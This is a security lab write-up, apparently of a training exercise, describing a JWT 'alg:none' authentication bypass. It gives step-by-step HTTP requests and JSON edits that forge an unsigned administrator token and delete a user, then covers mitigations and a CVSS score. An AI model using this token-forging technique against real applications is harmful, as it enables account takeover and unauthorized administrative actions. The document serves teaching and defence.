# Title: JWT: JWT authentication bypass via flawed signature verification

## Description

The application uses JSON Web Tokens (JWTs) for session management and authentication. However, the JWT implementation is vulnerable because the server accepts unsigned tokens when the `alg` (algorithm) header is set to `none`.

JWTs are intended to protect the integrity of authentication data using cryptographic signatures. In this implementation, the server trusts JWT claims without requiring a valid signature when the token specifies the `none` algorithm.

An attacker can modify sensitive claims, remove the signature entirely, and impersonate privileged users such as the administrator.

This vulnerability is commonly known as the **JWT "alg:none" Authentication Bypass**.

---

## Steps to Exploit

### 1. Obtain a Valid JWT

1. Log in using valid credentials:

```text id="9flm0v"
Username: wiener
Password: peter
```

2. Navigate to the account page.
3. Intercept a request containing the session cookie.

Example:

```http id="j1wl5s"
GET /my-account HTTP/1.1
Cookie: session=<JWT>
```

4. Observe that the session token is a JWT.

---

### 2. Decode the JWT

Inspect the token contents.

Original Header:

```json id="sbv97q"
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Original Payload:

```json id="6ah68m"
{
  "sub": "wiener"
}
```

The `sub` claim identifies the authenticated user.

---

### 3. Test Administrative Access

Modify the request path:

```http id="aj13ko"
GET /admin HTTP/1.1
```

Send the request.

Access is denied because the current user is not an administrator.

---

### 4. Modify the JWT Payload

Change the payload:

```json id="6iysxq"
{
  "sub": "administrator"
}
```

This causes the token to claim administrator privileges.

---

### 5. Modify the JWT Header

Change the algorithm from:

```json id="vjr50s"
{
  "alg": "HS256",
  "typ": "JWT"
}
```

to:

```json id="w7du64"
{
  "alg": "none",
  "typ": "JWT"
}
```

---

### 6. Remove the Signature

Original JWT structure:

```text id="tjy1el"
header.payload.signature
```

Modified JWT structure:

```text id="11vbjq"
header.payload.
```

The signature component is removed entirely while preserving the trailing period.

---

### 7. Replay the Forged Token

Send the modified token to the administrative endpoint:

```http id="utkw16"
GET /admin HTTP/1.1
Cookie: session=<modified_jwt>
```

The server accepts the unsigned token and grants administrator access.

---

### 8. Perform Administrative Actions

Locate the user deletion endpoint:

```http id="v7qf4r"
GET /admin/delete?username=carlos HTTP/1.1
```

Submit the request.

The user account is deleted successfully.

---

## Proof of Concept

### Original JWT Header

```json id="oq0jho"
{
  "alg": "HS256"
}
```

### Modified JWT Header

```json id="cdu6jq"
{
  "alg": "none"
}
```

### Original Payload

```json id="dl5d6w"
{
  "sub": "wiener"
}
```

### Modified Payload

```json id="bpx53r"
{
  "sub": "administrator"
}
```

### Forged JWT Format

```text id="2tp10a"
base64(header).base64(payload).
```

### Result

```text id="u3x6g6"
Administrative panel accessible without a valid signature
```

The successful access confirms authentication bypass.

---

## Impact

* Authentication bypass.
* Privilege escalation to administrator privileges.
* Unauthorized access to administrative functionality.
* Ability to modify or delete user accounts.
* Exposure of sensitive administrative information.
* Complete compromise of application authorization mechanisms.

---

## Mitigation / Remediation

### 1. Disable the "none" Algorithm

Reject all JWTs using:

```json id="t9rjg6"
{
  "alg": "none"
}
```

unless explicitly required by a secure and validated use case.

---

### 2. Enforce Signature Verification

Verify JWT signatures before processing any claims.

Example:

```java id="xzl1x2"
JWTVerifier verifier = JWT.require(algorithm).build();
DecodedJWT jwt = verifier.verify(token);
```

---

### 3. Use Algorithm Allow-Listing

Explicitly allow only approved algorithms.

Example:

```text id="ymn9qz"
HS256
RS256
ES256
```

Reject all unexpected algorithms.

---

### 4. Do Not Trust Client-Controlled Claims

Authorization decisions should be validated server-side and not rely solely on token contents.

---

### 5. Use Updated JWT Libraries

Employ maintained JWT libraries that reject unsigned tokens by default.

---

### 6. Conduct Security Reviews

Regularly assess JWT implementations for algorithm confusion and signature validation flaws.

---

## CVSS Score

**CVSS v3.1 Score:** 9.1 (Critical)

**Vector:**

```text id="y9pmv2"
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                 |
| ------------------- | --------- | --------------------------------------------- |
| Attack Vector       | Network   | Exploitable remotely through HTTP requests    |
| Attack Complexity   | Low       | Requires only JWT modification                |
| Privileges Required | Low       | Requires a valid authenticated account        |
| User Interaction    | None      | No victim interaction required                |
| Scope               | Unchanged | Impact remains within the application         |
| Confidentiality     | High      | Administrative information becomes accessible |
| Integrity           | High      | Administrative functionality can be abused    |
| Availability        | None      | No direct availability impact observed        |

---

## Conclusion

The application is vulnerable to JWT authentication bypass because it accepts unsigned JWTs when the `alg` header is set to `none`. An attacker can modify JWT claims, remove the signature, and impersonate privileged users without possessing the signing key. Proper signature verification and strict algorithm validation are required to prevent this class of authentication vulnerability.
